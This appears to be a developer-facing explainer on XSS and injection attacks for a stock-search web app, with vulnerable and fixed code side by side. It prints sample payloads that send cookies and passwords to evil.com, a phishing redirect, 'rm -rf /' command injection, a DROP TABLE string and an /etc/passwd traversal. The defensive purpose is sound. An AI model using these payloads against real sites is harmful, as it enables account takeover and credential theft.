# XSS and Injection Attacks Explained

## What is XSS (Cross-Site Scripting)?

**XSS** is an attack where malicious JavaScript code is injected into a website that other users view. The malicious script runs in the victim's browser.

---

## 🎯 How XSS Works

### The Flow:
1. **Attacker** sends malicious input to your website
2. Your website **doesn't sanitize** the input
3. Website **displays** the malicious code to other users
4. **Victim's browser** executes the malicious script
5. **Attacker gains access** to victim's session/cookies

---

## 🔴 BEFORE Our Fix - Vulnerable Code

### Example 1: Search Without Sanitization

```python
# ❌ VULNERABLE CODE (Before fix)
@app.route('/api/search/stocks', methods=['GET'])
def search_stocks():
    query = request.args.get('q', '').strip()  # ❌ No sanitization!
    # ... returns query in response
    
    return jsonify({'query': query, 'results': [...]})
```

### The Attack

**Step 1:** Attacker crafts malicious input
```
GET /api/search/stocks?q=<script>alert('XSS Attack')</script>
```

**Step 2:** Your server returns unsanitized data
```json
{
  "query": "<script>alert('XSS Attack')</script>",
  "results": [...]
}
```

**Step 3:** Frontend displays it
```javascript
// In app.js (Line 152)
suggestionItem.innerHTML = `
    <div>${suggestion.symbol}</div>  // ⚠️ Unsanitized!
`;
```

**Step 4:** Browser executes the script
```html
<!-- Rendered HTML -->
<div>
    <script>alert('XSS Attack')</script>  <!-- 💥 Executed! -->
</div>
```

---

## 🟢 AFTER Our Fix - Protected

### Example 1: Search With Sanitization

```python
# ✅ SECURE CODE (After fix)
@app.route('/api/search/stocks', methods=['GET'])
def search_stocks():
    from utils import sanitize_search_query
    
    query = request.args.get('q', '').strip()
    query = sanitize_search_query(query)  # ✅ Sanitized!
    
    return jsonify({'query': query, 'results': [...]})
```

### The Protection

**Attacker's malicious input:**
```
GET /api/search/stocks?q=<script>alert('XSS')</script>
```

**After sanitization:**
```
query = "scriptalertXSSscript"  # ✅ Dangerous chars removed
```

**Safe response:**
```json
{
  "query": "scriptalertXSSscript",  // ✅ Safe, no script tag
  "results": [...]
}
```

---

## 🚨 Types of Injection Attacks

### 1. **XSS (Cross-Site Scripting)** - The Code Executes

**What happens:**
- Malicious JavaScript runs in victim's browser
- Attacker can steal cookies, session tokens
- Attacker can hijack accounts

**Example Attack:**
```html
<!-- Attacker injects this -->
<script>
  // Steal user's authentication cookie
  fetch('https://evil.com/steal?cookie=' + document.cookie);
  // Redirect to phishing site
  window.location = 'https://evil.com/phishing';
</script>
```

### 2. **SQL Injection** - Database Attacked

**What happens:**
- Malicious SQL commands run against database
- Attacker can read/modify/delete data
- Attacker can bypass authentication

**Example (Not in your code - NoSQL example):**
```python
# ❌ VULNERABLE (if using SQL)
symbol = request.args.get('symbol')
query = f"SELECT * FROM stocks WHERE symbol = '{symbol}'"
# If symbol = "'; DROP TABLE stocks; --"
# Query becomes: SELECT * FROM stocks WHERE symbol = ''; DROP TABLE stocks; --'
```

**Fix:**
```python
# ✅ SECURE (Parameterized queries)
symbol = sanitize_stock_symbol(request.args.get('symbol'))
query = "SELECT * FROM stocks WHERE symbol = ?"
db.execute(query, (symbol,))  # Parameterized
```

### 3. **NoSQL Injection** - NoSQL Database Attacked

**Example (Firestore - Your case):**
```python
# ❌ POTENTIALLY VULNERABLE
user_query = {"symbol": request.args.get('symbol')}  # Unsanitized
results = db.collection('stocks').where('symbol', '==', user_query['symbol']).get()

# Attacker sends: {"symbol": {"$ne": null}}  # MongoDB operator!
```

**Fix (Your current implementation):**
```python
# ✅ SECURE
symbol = sanitize_stock_symbol(request.args.get('symbol'))
# Now symbol is clean: only letters, numbers, dots
results = db.collection('stocks').where('symbol', '==', symbol).get()
```

### 4. **Command Injection** - Server Commands Executed

**What happens:**
- Malicious shell commands executed on server
- Attacker can read files, delete data, take control

**Example (Not in your code):**
```python
# ❌ VULNERABLE
import os
symbol = request.args.get('symbol')
os.system(f"grep {symbol} data.txt")  # ❌ Dangerous!

# Attacker sends: symbol = "foo; rm -rf /; echo"
# Command becomes: grep foo; rm -rf /; echo data.txt
# Server deletes everything!
```

---

## 📍 Vulnerable Locations in Your Code

### 1. Frontend: InnerHTML Usage (Multiple Places)

```javascript
// ⚠️ RISKY (app.js line 152, 216, 496, etc.)
suggestionItem.innerHTML = `
    <div class="suggestion-symbol">${suggestion.symbol}</div>
`;
```

**The Problem:**
If `suggestion.symbol` contains `<img src=x onerror="malicious code">`, it executes!

**The Fix:**
```javascript
// ✅ SAFE
suggestionItem.textContent = suggestion.symbol;  // textContent escapes HTML
```

### 2. Frontend: React dangerouslySetInnerHTML

```javascript
// ⚠️ RISKY (react-ai-chat.js line 230)
<div dangerouslySetInnerHTML={{ __html: formatMessage(message.content) }} />
```

**The Problem:**
If `message.content` contains malicious HTML, it executes!

**The Fix:**
Always sanitize content before using `dangerouslySetInnerHTML`:
```javascript
// ✅ SAFE
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{ 
    __html: DOMPurify.sanitize(formatMessage(message.content)) 
}} />
```

### 3. Backend: Unvalidated URL Parameters

```python
# ⚠️ WAS VULNERABLE (Before fix)
@app.route('/api/stock/<symbol>')
def get_stock_data(symbol):
    symbol = symbol.upper()  # No validation!
    # ...
```

**Attack Example:**
```bash
GET /api/stock/../../etc/passwd
# Might try to access system files!
```

**Fix (Applied):**
```python
# ✅ SECURE
symbol = sanitize_stock_symbol(symbol)  # Removes dangerous chars
if not validate_stock_symbol(symbol):
    return error
```

---

## 💀 Real Attack Scenarios

### Scenario 1: Cookie Theft

**Attacker's Payload:**
```javascript
<script>
  // Steal authentication cookie
  var img = new Image();
  img.src = 'https://evil.com/steal?cookie=' + document.cookie;
</script>
```

**What Happens:**
1. Attacker injects this in search
2. All users viewing search results load the page
3. Their cookies are sent to evil.com
4. Attacker uses stolen cookies to log in as victims

### Scenario 2: Session Hijacking

**Attacker's Payload:**
```javascript
<script>
  // Redirect to fake login page
  localStorage.setItem('original_url', window.location.href);
  window.location = 'https://evil.com/fake-login.html';
</script>
```

**What Happens:**
1. Users redirected to fake login page
2. They enter credentials thinking it's real
3. Attacker steals credentials

### Scenario 3: Password Field Manipulation

**Attacker's Payload:**
```javascript
<script>
  // Change password field to send to attacker
  document.querySelector('input[type="password"]')
    .onchange = function(e) {
      fetch('https://evil.com/steal?password=' + e.target.value);
    };
</script>
```

**What Happens:**
1. Password is captured before form submission
2. Attacker receives passwords in real-time

---

## 🛡️ How Our Fixes Protect You

### 1. Input Sanitization (utils.py)

```python
def sanitize_search_query(query: str) -> str:
    # Remove dangerous characters
    sanitized = re.sub(r'[^a-zA-Z0-9\s\-\',.]', '', query)
    return sanitized[:100]  # Limit length too
```

**Protects Against:**
- ✅ XSS attempts (`<script>`, `<img onerror=`, etc.)
- ✅ SQL injection (`'; DROP TABLE--`, etc.)
- ✅ NoSQL injection (`{"$ne": null}`, etc.)
- ✅ DoS attacks (extremely long input)

### 2. Input Validation

```python
def validate_stock_symbol(symbol: str) -> bool:
    # Only allow letters, numbers, dots
    return bool(re.match(r'^[A-Z0-9.]+$', symbol))
```

**Protects Against:**
- ✅ Invalid symbols (symbols, spaces, etc.)
- ✅ Path traversal (`../../etc/passwd`)
- ✅ Command injection (`; rm -rf /`)

### 3. Length Limits

```python
# Prevent DoS attacks
query = sanitized[:100]  # Max 100 characters
```

**Protects Against:**
- ✅ Memory exhaustion (10MB of 'a' characters)
- ✅ Database query overload

---

## 🧪 Testing the Protection

### Test 1: XSS Attempt

```bash
curl "https://your-api.com/api/search/stocks?q=<script>alert('XSS')</script>"

# Before fix: Returns query with <script> tag
# After fix: Returns query as "scriptalertXSSscript"
```

### Test 2: SQL Injection Attempt

```bash
curl "https://your-api.com/api/stock/AAPL'; DROP TABLE stocks; --"

# Before fix: Might execute SQL command
# After fix: Symbol becomes "AAPL", dangerous chars removed
```

### Test 3: Path Traversal

```bash
curl "https://your-api.com/api/stock/../../etc/passwd"

# Before fix: Might access system files
# After fix: Symbol becomes "", validation fails
```

---

## 📊 Before vs After Comparison

| Attack Type | Before Fix | After Fix |
|-------------|-----------|-----------|
| XSS | ✅ Could inject scripts | ❌ Blocked by sanitization |
| SQL Injection | ⚠️ Possible (Firestore) | ❌ Blocked by validation |
| NoSQL Injection | ⚠️ Possible | ❌ Blocked by sanitization |
| Command Injection | ⚠️ Possible | ❌ Blocked by validation |
| DoS (long input) | ✅ Could crash | ❌ Blocked by length limit |
| Path Traversal | ✅ Could access files | ❌ Blocked by validation |

---

## 🎓 Key Takeaways

1. **Always sanitize** user input before displaying
2. **Always validate** input format before processing
3. **Never trust** data from users
4. **Use parameterized queries** for databases
5. **Limit input length** to prevent DoS
6. **Escape HTML** before displaying in `innerHTML`
7. **Use textContent** instead of innerHTML when possible
8. **Filter dangerous characters** (like `<`, `>`, `&`, `'`, `"`)

---

## 🔗 Additional Resources

- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

**Generated:** January 22, 2025  
**Related Files:** `utils.py`, `app.py`
